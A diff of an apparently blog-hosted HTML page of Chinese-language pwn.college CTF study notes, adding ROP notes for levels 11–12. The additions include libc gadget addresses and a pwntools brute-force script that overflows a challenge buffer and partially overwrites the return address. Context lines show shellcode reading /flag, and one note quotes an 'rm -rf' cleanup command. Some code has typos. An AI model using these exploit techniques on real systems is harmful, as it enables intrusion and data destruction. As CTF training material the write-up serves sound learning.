@@ -33,9 +33,10 @@
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220506101348091.png">
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220506104816965.png">
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220507162940280.png">
+<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220508231821229.png">
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220505165437735.png">
 <meta property="article:published_time" content="2022-01-16T14:00:00.000Z">
-<meta property="article:modified_time" content="2022-05-07T14:22:51.148Z">
+<meta property="article:modified_time" content="2022-05-08T16:20:08.757Z">
 <meta property="article:author" content="Yogdzewa">
 <meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary_large_image">
@@ -221,7 +222,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      64k 字
+      66k 字
     </span>
   
 
@@ -230,7 +231,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      802 分钟
+      822 分钟
     </span>
   
 
@@ -271,7 +272,7 @@
             
               <p class="note note-info">
                 
-                  不可视境界线最后变动于：2022年5月7日 晚上
+                  不可视境界线最后变动于：2022年5月9日 凌晨
                 
               </p>
             
@@ -284,7 +285,7 @@
 <li><p><strong>可以创建flag的符号链接, 不过除了$HOME其他目录均不能写, 只能在<code>~/</code>下.</strong> </p>
 </li>
 </ul>
-<h1 id="module-1"><a href="#module-1" class="headerlink" title="module 1"></a>module 1</h1><h2 id="The-file-system"><a href="#The-file-system" class="headerlink" title="The file system"></a>The file system</h2><p><img src="../../image/pwn-modules/image-20220117165401525.png" srcset="/img/loading.gif" lazyload alt="image-20220117165401525"></p>
+<h1 id="module-1-communication"><a href="#module-1-communication" class="headerlink" title="module 1-communication"></a>module 1-communication</h1><h2 id="The-file-system"><a href="#The-file-system" class="headerlink" title="The file system"></a>The file system</h2><p><img src="../../image/pwn-modules/image-20220117165401525.png" srcset="/img/loading.gif" lazyload alt="image-20220117165401525"></p>
 <figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">ln -s /old/path /new/path<br>&lt;in_file:      redirect in_file into the command&#x27;s input<br><span class="hljs-meta">&gt;</span><span class="bash">out_file:     redirect the <span class="hljs-built_in">command</span><span class="hljs-string">&#x27;s output into out_file, overwriting it</span></span><br><span class="hljs-meta">&gt;</span><span class="bash"><span class="hljs-string">&gt;out_file:    redirect the command&#x27;</span>s output into out_file, appending to it</span><br><span class="hljs-meta">2&gt;</span><span class="bash">error_file:  redirect the <span class="hljs-built_in">command</span><span class="hljs-string">&#x27;s errors into error_file, overwriting it</span></span><br><span class="hljs-meta">2&gt;</span><span class="bash"><span class="hljs-string">&gt;error_file: redirect the command&#x27;</span>s errors into error_file, appending to it</span><br></code></pre></div></td></tr></table></figure>
 
 <h2 id="Binary-files"><a href="#Binary-files" class="headerlink" title="Binary files"></a>Binary files</h2><blockquote>
@@ -626,7 +627,7 @@
 </ul>
 <h3 id="level"><a href="#level" class="headerlink" title="level??"></a>level??</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> pwn<br>pwn.context.log_level = <span class="hljs-string">&quot;DEBUG&quot;</span><br>p2 = pwn.process([<span class="hljs-string">&quot; /usr/bin/sed&quot;</span>, <span class="hljs-string">&quot;-e&quot;</span>, <span class="hljs-string">&quot;s/x/×/&quot;</span>])<br>p1 = pwn.process(glob.glob( <span class="hljs-string">&quot; /chailenge/enbryo* &quot;</span>)，stdout=p2.stdin)<br><span class="hljs-built_in">print</span>(p2.readall())<br></code></pre></div></td></tr></table></figure>
 
-<h1 id="module-2"><a href="#module-2" class="headerlink" title="module 2"></a>module 2</h1><ul>
+<h1 id="module-2-misuse"><a href="#module-2-misuse" class="headerlink" title="module 2-misuse"></a>module 2-misuse</h1><ul>
 <li><p><a target="_blank" rel="noopener" href="https://wiki.archlinux.org/title/File_permissions_and_attributes">文件权限</a> </p>
 </li>
 <li></li>
@@ -670,7 +671,7 @@
 </li>
 <li></li>
 </ul>
-<h1 id="module-3"><a href="#module-3" class="headerlink" title="module 3"></a>module 3</h1><p>就是汇编代码的写</p>
+<h1 id="module-3-asm"><a href="#module-3-asm" class="headerlink" title="module 3-asm"></a>module 3-asm</h1><p>就是汇编代码的写</p>
 <h2 id="3-简单乘法"><a href="#3-简单乘法" class="headerlink" title="3 简单乘法"></a>3 简单乘法</h2><p>要注意mul指令默认被乘数放在rax里面, 乘数由我们指定, 结果是拼接而成的: <strong>RDX:RAX</strong> </p>
 <figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>p = process(glob(<span class="hljs-string">&quot;/challenge/e*&quot;</span>))<br><br>shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov rax, rdi</span><br><span class="hljs-string">mov rcx, rdx</span><br><span class="hljs-string">mul rsi</span><br><span class="hljs-string">add rax, rcx</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>p.send(asm(shellcode))<br>p.interactive()<br></code></pre></div></td></tr></table></figure>
 
@@ -873,7 +874,7 @@
 
 <figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    push rbp</span><br><span class="hljs-string">    mov rbp, rsp</span><br><span class="hljs-string">    sub rsp, 0x100</span><br><span class="hljs-string">    mov rbx, -1</span><br><span class="hljs-string">AAA:</span><br><span class="hljs-string">    add rbx, 1</span><br><span class="hljs-string">    cmp rbx, rsi</span><br><span class="hljs-string">    je BBB</span><br><span class="hljs-string">    mov cl, byte ptr [rdi+rbx]</span><br><span class="hljs-string">    add BYTE ptr [rsp+rcx], 1</span><br><span class="hljs-string">    jmp AAA</span><br><span class="hljs-string"></span><br><span class="hljs-string">BBB:</span><br><span class="hljs-string">    mov rbx, -1</span><br><span class="hljs-string">    xor rcx, rcx</span><br><span class="hljs-string">    xor rdx, rdx</span><br><span class="hljs-string">CCC:</span><br><span class="hljs-string">    add rbx, 1</span><br><span class="hljs-string">    cmp rbx, 0x100</span><br><span class="hljs-string">    je DDD</span><br><span class="hljs-string">    cmp BYTE ptr [rsp+rbx], CL</span><br><span class="hljs-string">    jle CCC</span><br><span class="hljs-string">    mov CL, BYTE ptr [rsp+rbx]</span><br><span class="hljs-string">    mov rdx, rbx</span><br><span class="hljs-string">    JMP CCC</span><br><span class="hljs-string"></span><br><span class="hljs-string">DDD:</span><br><span class="hljs-string">    mov rax, rdx</span><br><span class="hljs-string">    mov rsp, rbp</span><br><span class="hljs-string">    pop rbp</span><br><span class="hljs-string">    ret</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure>
 
-<h1 id="module-4"><a href="#module-4" class="headerlink" title="module 4"></a>module 4</h1><p>基本全在PPT里面.</p>
+<h1 id="module-4-sc"><a href="#module-4-sc" class="headerlink" title="module 4-sc"></a>module 4-sc</h1><p>基本全在PPT里面.</p>
 <h2 id="0-基本操作"><a href="#0-基本操作" class="headerlink" title="0.基本操作"></a>0.基本操作</h2><ul>
 <li>intro:<ul>
 <li><p>Buiding shellcode: just using pwntools.</p>
@@ -997,7 +998,7 @@
 <p>仍然是利用了rax等于0, rdx是shellmem地址, 也可以当做是要读取的字节数使用read函数的话只有rsi(第二个参数)需要改为rdx上的地址, 简单mov就可以了. 然后第二阶段随便整.</p>
 <figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">xor edi, edi</span><br><span class="hljs-string">mov esi, edx</span><br><span class="hljs-string">syscall	//call read(0, 0x14e40000, 0x14e40000)</span><br><span class="hljs-string">//2-stage shellcode</span><br><span class="hljs-string">.space 6, 0x90</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode += shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>)<br>shellcode += shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, <span class="hljs-number">0x14e40000</span>+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x40</span>)<br>shellcode += shellcraft.amd64.write(<span class="hljs-number">1</span>,    <span class="hljs-number">0x14e40000</span>+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x40</span>)<br><br>payload = asm(shellcode)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/home/hacker/input&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> o:<br>    o.write(payload)<br></code></pre></div></td></tr></table></figure>
 
-<h1 id="module-5"><a href="#module-5" class="headerlink" title="module 5"></a>module 5</h1><ul>
+<h1 id="module-5-jail"><a href="#module-5-jail" class="headerlink" title="module 5-jail"></a>module 5-jail</h1><ul>
 <li><p>chroot(“/tmp/jail”)</p>
 <ul>
 <li><p>chroot(“/tmp/jail”) does NOT:</p>
@@ -1113,7 +1114,7 @@
 <p>感觉没有任何限制啊, 就是构造一点父子进程间特有的命令.</p>
 </blockquote>
 <p>开始gdb refresher!!!!!</p>
-<h1 id="module-6"><a href="#module-6" class="headerlink" title="module 6"></a>module 6</h1><p>GDB时间!</p>
+<h1 id="module-6-gdb"><a href="#module-6-gdb" class="headerlink" title="module 6-gdb"></a>module 6-gdb</h1><p>GDB时间!</p>
 <ul>
 <li>info有好多东西. 看到一个<code>i proc m(appings)</code>, 不就是我上次用的<code>! cat /proc/pid/maps</code>么.</li>
 <li> 一份超好看的<a target="_blank" rel="noopener" href="https://www.cs.umd.edu/class/spring2015/cmsc414/downloads/gdb-refcard.pdf">cheatsheet</a>!</li>
@@ -1167,7 +1168,7 @@
 
 <p>一个level能挣这么多东西出来…….</p>
 <h3 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h3><p>直接一个<code>call (void*)win()</code>就结束了….</p>
-<h1 id="module-7"><a href="#module-7" class="headerlink" title="module 7"></a>module 7</h1><ul>
+<h1 id="module-7-rev"><a href="#module-7-rev" class="headerlink" title="module 7-rev"></a>module 7-rev</h1><ul>
 <li>forword engineering vs. reverse engineering</li>
 <li><code>cpp du strip strings</code> commands.</li>
 <li>the most often we do is reversing the main modules.</li>
@@ -1187,7 +1188,7 @@
 </ul>
 </li>
 <li>Timeless Debugging<ul>
-<li><strong>gdb</strong> has built-in record-replay functionality (<a target="_blank" rel="noopener" href="https://sourceware.org/gdb/current/onlinedocs/gdb/Process-Record-and-Replay.html">doc</a>)</li>
+<li><strong>gdb</strong> has built-in record-replay functionality (<a target="_blank" rel="noopener" href="https://sourceware.org/gdb/onlinedocs/gdb/Reverse-Execution.html#Reverse-Execution">doc</a>)</li>
 <li><strong>rr</strong> is a highly-performant record-replay engine (<a target="_blank" rel="noopener" href="https://github.com/mozilla/rr">github</a>) <a target="_blank" rel="noopener" href="https://github.com/rr-debugger/rr/wiki/Usage">doc</a> </li>
 <li><strong>qira</strong> is a timeless debugger made for reverse engineering (<a target="_blank" rel="noopener" href="https://qira.me/">https://qira.me/</a>) </li>
 </ul>
@@ -1345,7 +1346,7 @@
 <h3 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h3><p>更特别了. 主要是这个<code>rerandomize()</code>函数, 其中寄存器, 指令, 系统调用, cmp标志位全部都是随机的. 随机的方法是8个int8随机选取两个进行交换, 执行65535次.</p>
 <p>难道是在变化中找到不变的东西?</p>
 <p>噢虽然是随机的但是由于rand的特点(种子和flag有关), 每次的值都不会变, 这样子只要编写一些logic去brute force一些指令和值就可以了.</p>
-<h1 id="module-8"><a href="#module-8" class="headerlink" title="module 8"></a>module 8</h1><ul>
+<h1 id="module-8-exp"><a href="#module-8-exp" class="headerlink" title="module 8-exp"></a>module 8-exp</h1><ul>
 <li>时至2022年4月22日, c语言排名<a target="_blank" rel="noopener" href="https://www.tiobe.com/tiobe-index/">第二位</a>, 历史最低为第二位. 大部分逆向工具反编译出的结果都是类C语言, 因为c语言是最接近汇编的语言, 还给了开发者一种使用高级语言而不是直接通过汇编去操作寄存器的选择, 被大量使用在操作系统和其他软件的代码中. 而c语言的内存完全控制所带来的问题在near future不会消失, 比如说一些嵌入式设备需要c语言来开发等等.</li>
 </ul>
 <figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = gdb.debug(<span class="hljs-string">&#x27;./balabala&#x27;</span>)<br>test_string = cyclic(<span class="hljs-number">128</span>) 	<span class="hljs-comment"># used to identify the location of overflow string</span><br>cyclic_find(<span class="hljs-string">&quot;gaaa&quot;</span>)<br></code></pre></div></td></tr></table></figure>
@@ -1444,7 +1445,7 @@
 
 
 
-<h1 id="module-9"><a href="#module-9" class="headerlink" title="module 9"></a>module 9</h1><p>nothing special.</p>
+<h1 id="module-9-mem"><a href="#module-9-mem" class="headerlink" title="module 9-mem"></a>module 9-mem</h1><p>nothing special.</p>
 <h4 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h4><p>canary disabled.</p>
 <p>inject shellcode to a map region, and then overwrite return address to jmp to executing shellcode.</p>
 <h4 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h4><p>保护全关. 可执行栈. 确实没有什么东西, 没开PIE的话栈的位置都是一样的, shellcode注入的地点也可以使用绝对地址来确定.</p>
@@ -1498,7 +1499,7 @@
 <h4 id="level10-2"><a href="#level10-2" class="headerlink" title="level10"></a>level10</h4><p>这次在上一题的基础上补上了read_memory的错误, 仍然只能用用一次syscall. <strong>边界检查全开</strong>.</p>
 <p>这???</p>
 <h4 id="level11-2"><a href="#level11-2" class="headerlink" title="level11"></a>level11</h4><p>JIT pray, Yan85_64, 保护全开, 全新逻辑, 暂且放弃.</p>
-<h1 id="module-A"><a href="#module-A" class="headerlink" title="module A"></a>module A</h1><p>ROP</p>
+<h1 id="module-A-rop"><a href="#module-A-rop" class="headerlink" title="module A-rop"></a>module A-rop</h1><p>ROP</p>
 <ul>
 <li>rp++, ROPgadget.<ul>
 <li><code>rp++ --unique -r2 -f /bin/bash | grep -P &quot;(add|sub|mov) rax, r..&quot;</code> </li>
@@ -1606,8 +1607,38 @@
 <p>远程跑总是有点问题, 没法调试. 懒得管了.</p>
 <img src="../../image/pwn-modules/image-20220507162940280.png" srcset="/img/loading.gif" lazyload alt="image-20220507162940280" style="zoom:80%;" />
 
-<h4 id="level11-3"><a href="#level11-3" class="headerlink" title="level11"></a>level11</h4><p>challenge()函数的主逻辑前后都加上了超级多的nop作为填充. 这有啥用?</p>
-<h1 id="module-B"><a href="#module-B" class="headerlink" title="module B"></a>module B</h1><p>Dynamic Allocators:</p>
+<h4 id="level11-3"><a href="#level11-3" class="headerlink" title="level11"></a>level11</h4><p>和上一题一样, 不过challenge()函数的主逻辑前后都加上了超级多的nop作为填充. 这有啥用?</p>
+<p>确实没有区别. 改一改偏移量就过了.</p>
+<h4 id="level12-2"><a href="#level12-2" class="headerlink" title="level12"></a>level12</h4><p>保护没有变化. 这又有什么区别?? 0号程序还提供了win函数的地址, 这不白给么.</p>
+<ul>
+<li>突然就不行了, 使用gdb的record来查找问题, 好像只能在当前执行过程中使用save和restore命令.</li>
+<li>ROPgadget使用only命令的时候想要的命令要全部打出来, 而不仅是或的关系.</li>
+<li><code>find /tmp -atime +5 -exec rm -rf &#123;&#125; +</code> 还是别用了.</li>
+<li><code>egrep &#39;(pop (rbp|rsp))|leave&#39; -a libc233.gadget</code> ==<br><code>ROPgadget --binary /lib/x86_64-linux-gnu/libc-2.33.so --only &#39;pop|ret&#39;</code> </li>
+</ul>
+<p>这题原来指的是从libc中进行ROP, 因为main函数返回到了高地址中的libc.so中.可以直接在libc文件中搜索可执行的ROP段.也不一定要leave, <code>pop rsp</code>不照样行.</p>
+<p>2.33中:</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#0x000000000004e250 : leave ; ret</span><br><span class="hljs-number">0x000000000002798b</span> : pop rsp ; ret  <span class="hljs-comment">#看起来不错</span><br><span class="hljs-number">0x0000000000027e3f</span> : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret<br><span class="hljs-number">0x0000000000027c27</span> : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret<br></code></pre></div></td></tr></table></figure>
+
+<blockquote>
+<p>2.31中:</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs x86asm"><span class="hljs-number">0x00000000000578f8</span> : <span class="hljs-keyword">leave</span> <span class="hljs-comment">; ret</span><br><span class="hljs-number">0x00000000000c7ad3</span> : <span class="hljs-keyword">leave</span> <span class="hljs-comment">; ret 0xfff6</span><br></code></pre></div></td></tr></table></figure>
+<p>嗯不对, main return到的地址也是有偏移的.</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#这个是main函数的返回地址</span><br>pwndbg&gt; vmmap <span class="hljs-number">0x7efef009a7ed</span><br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>    <span class="hljs-number">0x7efef0099000</span>     <span class="hljs-number">0x7efef01e1000</span> r-xp   <span class="hljs-number">148000</span> <span class="hljs-number">26000</span>  /usr/lib/x86_64-linux-gnu/libc-<span class="hljs-number">2.33</span>.so +<span class="hljs-number">0x17ed</span><br>    <br><span class="hljs-comment">#到libc初始的偏移是`0x277ed`:</span><br>pwndbg&gt; distance <span class="hljs-number">0x7f6b0c0fb000</span> <span class="hljs-number">0x7f6b0c1227ed</span><br>	<span class="hljs-number">0x7f6b0c0fb000</span>-&gt;<span class="hljs-number">0x7f6b0c1227ed</span> <span class="hljs-keyword">is</span> <span class="hljs-number">0x277ed</span> <span class="hljs-built_in">bytes</span> (<span class="hljs-number">0x4efd</span> words)<br></code></pre></div></td></tr></table></figure>
+
+<p>使用偏移量为0x2798b的<code>pop rsp;ret</code>, 这样修改最低两字节, 只有4位无法确定.</p>
+<p>决定了! 就改为<code>0x798b</code>!</p>
+<blockquote>
+<p><del>又发现地址好像和libc没什么关系, 是紧挨着ld.so的…</del> 这个方向错了</p>
+<img src="../../image/pwn-modules/image-20220508231821229.png" srcset="/img/loading.gif" lazyload alt="image-20220508231821229" style="zoom:67%;" /> 
+</blockquote>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *                                   <br>binary = <span class="hljs-string">&#x27;./babyrop_level12.1.elf64&#x27;</span>                <br>context.binary = binary                             <br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>                         <br><span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):                                        <br>    p = process(binary)                             <br>    sc = <span class="hljs-string">&#x27;&#x27;&#x27;                                        </span><br><span class="hljs-string">    b *main+0x19f                                   </span><br><span class="hljs-string">    init-pwndbg                                     </span><br><span class="hljs-string">    lm                                              </span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>                                             <br>    <span class="hljs-comment">#gdb.attach(p, gdbscript=sc)                     </span><br>    p.recvuntil(<span class="hljs-string">b&#x27;located at: 0x&#x27;</span>)                  <br>    buf = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)                       <br>    pl = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x48</span>+<span class="hljs-number">8</span>), <span class="hljs-string">b&#x27;\x8b\x79&#x27;</span>, buf])   <br>                                                    <br>    p.send(pl)                                      <br>    <span class="hljs-built_in">all</span> = p.recvall()                               <br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">all</span>:                              <br>        <span class="hljs-keyword">break</span>                                       <br>    <span class="hljs-keyword">else</span>:.                                          <br>        p.kill()                                    <br></code></pre></div></td></tr></table></figure>
+
+
+
+<h1 id="module-B-heap"><a href="#module-B-heap" class="headerlink" title="module B-heap"></a>module B-heap</h1><p>Dynamic Allocators:</p>
 <ul>
 <li><strong>General Purpose:</strong> Doug Lea (pictured) releases dlmalloc into public domain in 1987.</li>
 <li><strong>Linux:</strong> ptmalloc (<strong>P</strong>osix <strong>T</strong>hread aware fork of dlmalloc)</li>
